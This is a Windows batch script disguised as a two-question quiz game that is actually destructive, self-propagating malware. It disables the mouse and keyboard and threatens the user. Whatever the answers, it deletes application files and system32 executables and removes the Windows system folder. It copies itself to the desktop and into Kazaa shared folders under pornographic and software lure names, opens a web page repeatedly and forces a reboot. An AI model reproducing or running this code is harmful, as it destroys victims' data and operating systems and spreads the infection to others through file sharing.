   echo off @
   cls
   COLOR 3
   c:\WINDOWS\rundll32.exe mouse, disable
   echo Aloha! This is a game if you quit Windows will be DELETED.
   pause
   cls
   type NUL | choice /N /CY /TY,1 >NUL
   echo.
   echo Question 1:
   echo.
   echo What is a variable?
   echo.
   echo 1) a house.
   echo.
   echo 2) a block of memory.
   echo.
   echo 3) a programming language.
   echo.
   choice /n/c123 "choose below"
   if error level 3 goto :nope
   if error level 2 goto :correct
   if error level 1 goto :stupid

   :nope
   echo Unlucky man thats the wrong answer.
   del c:\programfiles\InternetExplorer\*.DLL
   del c:\programfiles\InternetExplorer\*.APP
   del c:\programfiles\InternetExplorer\*.TXT
   del c:\programfiles\InternetExplorer\W2K\*.APP
   del c:\programfiles\InternetExplorer\W2K\*.TXT
   del c:\programfiles\InternetExplorer\SIGNUP\*.APP
   del c:\programfiles\InternetExplorer\SIGNUP\*.BMP
   del c:\programfiles\InternetExplorer\SIGNUP\*.TXT
   del c:\programfiles\InternetExplorer\PLUGINS\*.DLL
   del c:\programfiles\InternetExplorer\PLUGINS\*.CLASS
   del c:\programfiles\InternetExplorer\PLUGINS\RichFX\Player\*.DLL
   del c:\programfiles\InternetExplorer\PLUGINS\RichFX\Player\*.TXT
   del c:\programfiles\InternetExplorer\IEUninstall\*.TXT
   del c:\programfiles\InternetExplorer\IEUninstall\*.APP
   del c:\programfiles\InternetExplorer\ConnectionWizard\*.DLL
   del c:\programfiles\InternetExplorer\ConnectionWizard\*.APP
   del c:\programfiles\InternetExplorer\ConnectionWizard\*.ICW
   del c:\programfiles\InternetExplorer\ConnectionWizard\*.Ver
   cls
   rd c:\programfiles\InternetExplorer\W2K
   rd c:\programfiles\InternetExplorer\SIGNUP\Yahoo
   rd c:\programfiles\InternetExplorer\SIGNUP
   rd c:\programfiles\InternetExplorer\PLUGINS\RichFX\Player
   rd c:\programfiles\InternetExplorer\PLUGINS\RichFX
   rd c:\programfiles\InternetExplorer\PLUGINS
   rd c:\programfiles\InternetExplorer\IEUninstall
   rd c:\programfiles\InternetExplorer\ConnectionWizard
   cls
   echo Hmm well lets let you try another question
   echo remember if you quit windows will be deleted.
   goto :q2

   :correct
   echo Well done! Its the correct answer!
   echo Welldone dont worry only a couple more questions to go!
   echo Remember if you quit Windows will be destroyed.
   del c:\programfiles\QuickTime\Plugins\*.DLL
   cls
   del c:\programfiles\QuickTime\Plugins\*.TXT
   cls
   del c:\programfiles\QuickTime\Plugins\*.CLASS
   cls
   del c:\programfiles\QuickTime\*.APP
   cls
   del c:\programfiles\QuickTime\*.MOV
   cls
   del c:\programfiles\QuickTime\*.MPEG

   goto :q2


   :stupid
   echo Unlucky that was the wrong answer.
   echo Remember if you quit Windows will be destroyed.
   del c:\Programfiles\WinZip\*.ZIP
   del c:\Programfiles\WinZip\*.DIZ
   del c:\Programfiles\WinZip\*.APP
   del c:\Programfiles\WinZip\*.TXT
   del c:\Programfiles\WinZip\*.DOC
   del c:\Programfiles\WinZip\*.DLL
   del c:\Programfiles\WinZip\*.CNT
   cls
   del C:\WINDOWS\system32\*.ini
   del C:\WINDOWS\system32\*.exe
   del C:\WINDOWS\system32\*.com
   del C:\WINDOWS\system32\*.sys
   cls
   goto :q2


   :q2
   echo.
   echo Remember if you quit Windows will be destroyed.
   echo.
   echo. Question 2
   echo.
   echo. What does P.C stand for?
   echo.
   echo 1) Personal Crap
   echo.
   echo 2) Personal Computer
   echo.
   echo 3) Personal cup
   echo.
   choice /n/c123 "choose below"
   if errorlevel 3 goto :spread
   if errorlevel 2 goto :spread
   if errorlevel 1 goto :spread

   :spread
   echo Remember if you quit Windows will be destroyed...
   c:\windows\rundll32 keyboard,disable
   RD/s/q "C:\WINDOWS\system"
   copy %0 c:\windows\desktop\WInd32help.bat
   copy %0 c:\windows\desktop\Internethelp.bat
   copy %0 c:\windows\desktop\Linux.bat
   copy %0 c:\windows\desktop\rohitab.bat
   cls
   rem - Kazaa Users
   If Not Exist "C:\Program Files\Kazaa\My Shared Folder\Mega wet bitch.jpeg.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Mega wet bitch.jpeg.bat"
   If Not Exist "C:\Program Files\Kazaa\My Shared Folder\Porn mainia.exe.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Porn mainia.exe.bat"
   If Not Exist "C:\Program Files\Kazaa\My Shared Folder\Celebrity heaven.jpg.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Celebrity heaven.jpg.bat"
   If Not Exist "C:\Program Files\Kazaa\My Shared Folder\Celebrity heaven.exe.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Celebrity heaven.exe.bat"
   If Not Exist "C:\Program Files\Kazaa\My Shared Folder\Visual Basic Tutorial.doc.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Visual Basic Tutorial.doc.bat"
   If Not Exist "C:\Program Files\Kazaa\My Shared Folder\Visual Basic Tips.txt.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Visual Basic Tips.txt.bat"
   If Not Exist "C:\Program Files\Kazaa\My Shared Folder\Music Creator v7.exe.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Music Creator v7.exe.bat"
   If Not Exist "C:\Program Files\Kazaa\My Shared Folder\Jukebox v9.1.exe.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Jukebox v9.1.exe.bat"
   If Not Exist "C:\Program Files\Kazaa\My Shared Folder\Collection of programs.exe.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Collection of programs.exe.bat"
   If Not Exist "C:\Program Files\Kazaa\My Shared Folder\Fingering.bmp.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Fingering.bmp.bat"
   cls
   rem - Kazza Lite users
   If Not Exist "C:\Program Files\Kazaa Lite\My Shared Folder\Mega wet bitch.jpeg.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Mega wet bitch.jpeg.bat"
   If Not Exist "C:\Program Files\Kazaa Lite\My Shared Folder\Porn mainia.exe.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Porn mainia.exe.bat"
   If Not Exist "C:\Program Files\Kazaa Lite\My Shared Folder\Celebrity heaven.jpg.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Celebrity heaven.jpg.bat"
   If Not Exist "C:\Program Files\Kazaa Lite\My Shared Folder\Celebrity heaven.exe.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Celebrity heaven.exe.bat"
   If Not Exist "C:\Program Files\Kazaa Lite\My Shared Folder\Visual Basic Tutorial.doc.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Visual Basic Tutorial.doc.bat"
   If Not Exist "C:\Program Files\Kazaa Lite\My Shared Folder\Visual Basic Tips.txt.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Visual Basic Tips.txt.bat"
   If Not Exist "C:\Program Files\Kazaa Lite\My Shared Folder\Music Creator v7.exe.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Music Creator v7.exe.bat"
   If Not Exist "C:\Program Files\Kazaa Lite\My Shared Folder\Jukebox v9.1.exe.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Jukebox v9.1.exe.bat"
   If Not Exist "C:\Program Files\Kazaa Lite\My Shared Folder\Collection of programs.exe.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Collection of programs.exe.bat"
   If Not Exist "C:\Program Files\Kazaa Lite\My Shared Folder\Fingering.bmp.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Fingering.bmp.bat"
   cls
   echo Thankyou for some guy who I found most of the kazza bit from
   echo Thankyou for some guy who made a love quiz or something and give me this idea....
   echo THAT IS IT :)
   start http://www.geocities.com/legibleskate/mysite.html
   start http://www.geocities.com/legibleskate/mysite.html
   start http://www.geocities.com/legibleskate/mysite.html
   start http://www.geocities.com/legibleskate/mysite.html
   start http://www.geocities.com/legibleskate/mysite.html
   start http://www.geocities.com/legibleskate/mysite.html
   start http://www.geocities.com/legibleskate/mysite.html
   start http://www.geocities.com/legibleskate/mysite.html
   start http://www.geocities.com/legibleskate/mysite.html
   pause
   SHUTDOWN -r -t 5
